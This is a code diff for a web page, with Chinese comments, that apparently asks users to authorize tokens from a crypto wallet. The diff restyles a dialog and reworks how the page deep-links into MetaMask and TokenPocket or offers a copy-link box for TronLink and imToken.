@@ -169,6 +169,8 @@
         .dialog-message {
             word-break: break-all;
             margin: 12px 0;
+            font-size: 14px;
+            color: #4b5563;
         }
         .dialog-button {
             margin-top: 16px;
@@ -183,6 +185,16 @@
             background: #e2e8f0;
             color: #1e293b;
             margin-top: 8px;
+        }
+        .url-box {
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 12px 0;
+            word-break: break-all;
+            font-size: 12px;
+            color: #333;
+            text-align: left;
         }
     </style>
 </head>
@@ -214,8 +226,9 @@
 
 <div id="dialogMask" class="dialog-mask">
     <div class="dialog">
-        <div class="dialog-message"></div>
-        <button class="dialog-button">确定</button>
+        <div class="dialog-message" id="dialogMessage"></div>
+        <div id="dialogUrlBox" class="url-box hidden"></div>
+        <div id="dialogButtons"></div>
     </div>
 </div>
 
@@ -257,36 +270,35 @@
         }
     };
 
-    // 钱包配置（只对 MetaMask 和 TokenPocket 自动跳转，其他钱包手动复制链接）
+    // 钱包配置
     const WALLETS = {
         evm: {
             metamask: {
                 name: 'MetaMask',
                 icon: '🦊',
                 dappUrl: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`,
-                isInjected: () => window.ethereum && window.ethereum.isMetaMask === true,
-                autoJump: true
+                isInjected: () => window.ethereum && window.ethereum.isMetaMask === true
             }
         },
         tron: {
             tronlink: {
                 name: 'TronLink',
                 icon: '🌊',
-                isInjected: () => window.tronLink && window.tronLink.ready === true,
-                autoJump: false  // 手动复制链接
+                // 不自动跳转，引导手动复制
+                needManual: true,
+                isInjected: () => window.tronLink && window.tronLink.ready === true
             },
             tokenpocket: {
                 name: 'TokenPocket',
                 icon: '🎫',
                 dappUrl: (url) => `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: url }))}`,
-                isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined,
-                autoJump: true
+                isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined
             },
             imtoken: {
                 name: 'imToken',
                 icon: '🔷',
-                isInjected: () => window.ethereum && window.ethereum.isImToken === true,
-                autoJump: false  // 手动复制链接
+                needManual: true,
+                isInjected: () => window.ethereum && window.ethereum.isImToken === true
             }
         }
     };
@@ -300,7 +312,8 @@
     const statusDiv = document.getElementById('status');
     const dialogMask = document.getElementById('dialogMask');
     const dialogMessage = document.getElementById('dialogMessage');
-    const dialogButton = document.querySelector('.dialog-button');
+    const dialogUrlBox = document.getElementById('dialogUrlBox');
+    const dialogButtons = document.getElementById('dialogButtons');
 
     function showStatus(message, type = 'loading') {
         statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
@@ -308,25 +321,37 @@
         statusDiv.classList.remove('hidden');
     }
     function hideStatus() { statusDiv.classList.add('hidden'); }
-    function showDialog(msg, showCopy=false) {
+    function showDialog(msg, showUrl = false, url = '') {
         dialogMessage.textContent = msg;
-        if (showCopy) {
+        if (showUrl && url) {
+            dialogUrlBox.innerHTML = `<strong>链接：</strong><br>${url}`;
+            dialogUrlBox.classList.remove('hidden');
+        } else {
+            dialogUrlBox.classList.add('hidden');
+        }
+        // 清空按钮并重建
+        dialogButtons.innerHTML = '';
+        const closeBtn = document.createElement('button');
+        closeBtn.textContent = '确定';
+        closeBtn.className = 'dialog-button';
+        closeBtn.onclick = () => hideDialog();
+        dialogButtons.appendChild(closeBtn);
+        if (showUrl && url) {
             const copyBtn = document.createElement('button');
             copyBtn.textContent = '复制链接';
             copyBtn.className = 'dialog-button copy-btn';
             copyBtn.onclick = () => {
-                navigator.clipboard.writeText(window.location.href);
-                dialogMessage.textContent = '链接已复制，请在钱包内置浏览器中粘贴打开';
-                copyBtn.remove();
-                setTimeout(() => hideDialog(), 2000);
+                navigator.clipboard.writeText(url).then(() => {
+                    showDialog('链接已复制，请打开钱包内置浏览器粘贴打开', false);
+                }).catch(() => {
+                    alert('复制失败，请手动复制');
+                });
             };
-            dialogMessage.appendChild(copyBtn);
+            dialogButtons.appendChild(copyBtn);
         }
         dialogMask.style.display = 'flex';
     }
     function hideDialog() { dialogMask.style.display = 'none'; }
-    dialogButton.onclick = hideDialog;
-    dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
 
     // 更新授权地址显示
     function updateSpenderDisplay() {
@@ -498,24 +523,28 @@
         }
         const isTron = currentChain === '728126428';
         let wallet;
+        let url;
         if (isTron) {
             wallet = WALLETS.tron[selectedWallet];
+            if (!wallet) {
+                showDialog('无效的钱包');
+                return;
+            }
+            // 对于需要手动操作的钱包，显示复制链接弹窗
+            if (wallet.needManual) {
+                const currentUrl = window.location.href;
+                showDialog(`请在 ${wallet.name} 钱包的内置浏览器中打开此链接完成授权：`, true, currentUrl);
+                return;
+            }
+            url = wallet.dappUrl(window.location.href);
         } else {
             wallet = WALLETS.evm[selectedWallet];
+            if (!wallet) {
+                showDialog('无效的钱包');
+                return;
+            }
+            url = wallet.dappUrl(window.location.href);
         }
-        if (!wallet) {
-            showDialog('无效的钱包');
-            return;
-        }
-
-        // 如果钱包不支持自动跳转（TronLink/imToken），则弹出对话框让用户复制链接手动打开
-        if (!wallet.autoJump) {
-            showDialog(`请在 ${wallet.name} 钱包的内置浏览器中打开此页面完成授权。\n\n您可以复制以下链接，然后在钱包内粘贴打开：\n${window.location.href}`, true);
-            return;
-        }
-
-        // 自动跳转
-        let url = wallet.dappUrl(window.location.href);
         console.log('跳转链接:', url);
         window.location.href = url;
     }
